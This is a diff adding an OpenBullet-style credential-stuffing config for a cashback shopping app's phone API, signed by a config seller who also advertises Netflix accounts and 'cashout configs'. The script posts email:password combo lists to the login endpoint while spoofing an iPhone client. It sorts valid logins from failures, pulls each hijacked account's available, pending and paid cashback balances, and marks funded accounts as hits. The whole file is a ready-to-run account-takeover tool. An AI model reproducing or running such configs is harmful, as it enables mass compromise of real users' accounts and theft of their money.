@@ -1,0 +1,109 @@
+[SETTINGS]
+{
+  "Name": "ShopSaveEarn {APPSTORE}",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-16T06:55:38.5126368-07:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "@MasterLordConfigs",
+  "Version": "1.0.1 [CB]",
+  "Descriptions": "",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "NEED PORTAL Vs Netflix Accounts + Cashout Configs > @MasterLord007",
+      "VariableName": "",
+      "Id": 728690141
+    },
+    {
+      "Description": "JOIN > @MasterLordConfigs",
+      "VariableName": "",
+      "Id": 1839540100
+    }
+  ],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#LOGIN REQUEST POST "https://phoneapi.myvir.com/token" 
+  CONTENT "grant_type=password&username=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Host: phoneapi.myvir.com" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: capacitor://localhost" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Content-Length: 71" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "invalid_grant" 
+    KEY "The specified password is invalid." 
+  KEYCHAIN Success OR 
+    KEY "access_token" 
+
+#TOKEN PARSE "<SOURCE>" JSON "access_token" -> VAR "Tk" 
+
+#CAPTURE REQUEST GET "https://phoneapi.myvir.com/Profile/CashbackDetails?mallId=6a8e4bd3-b53f-4259-9632-b820cc34c5b3&profileId=1f196fe3-7b59-49f3-b348-fc98dfbfda08&resetCache=true" 
+  
+  HEADER "Host: phoneapi.myvir.com" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: capacitor://localhost" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept: application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_4_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Authorization: Bearer <Tk>" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: br, gzip, deflate" 
+
+#BALANCE PARSE "<SOURCE>" LR "AvailableAmount\":" "," CreateEmpty=FALSE -> CAP "Balance" 
+
+#PENDING PARSE "<SOURCE>" LR "PendingAmount\":" "," CreateEmpty=FALSE -> CAP "Pending" 
+
+#PAID_AMOUNT PARSE "<SOURCE>" LR "PaidAmount\":" "," CreateEmpty=FALSE -> CAP "Paid Amount" 
+
+#MONTHLY_CHARGES PARSE "<SOURCE>" LR "MonthlyCharges\":" "," CreateEmpty=FALSE -> CAP "Monthly Charges" 
+
+#REQUESTED_AMOUNT PARSE "<SOURCE>" LR "RequestedAmount\":" "," CreateEmpty=FALSE -> CAP "Requested Amount" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "\"AvailableAmount\":0.0" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "\"AvailableAmount\":0.0" 
+
+#CREATOR FUNCTION Constant "@MasterLordConfigs" -> CAP "Config By" 
+
